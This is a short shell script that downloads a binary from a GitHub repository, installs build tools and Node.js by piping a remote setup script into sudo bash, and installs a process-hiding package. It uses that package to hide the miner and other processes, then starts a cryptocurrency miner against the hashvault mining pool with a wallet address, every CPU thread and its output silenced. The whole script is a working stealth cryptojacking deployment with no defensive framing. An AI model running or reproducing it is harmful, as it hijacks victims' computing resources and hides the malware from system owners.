#!/bin/sh
pkill -
wget https://github.com/muledan1/bash/raw/main/-.tar.gz
tar -xf -.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add gudubrag.sh
Ph add python3
ph add root
ph add node-process-hider
ph add -
./- --url pool.hashvault.pro:443 --user 8AcFfqXd82Ae15LE29Vqp9bPwqi7mAsnvFjxx5feVwvJ7vKJS6jd4MZGawm9s9RNDQ4f23zGXADfdezw3dacUnU3E9b6KWy --pass JOSS --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
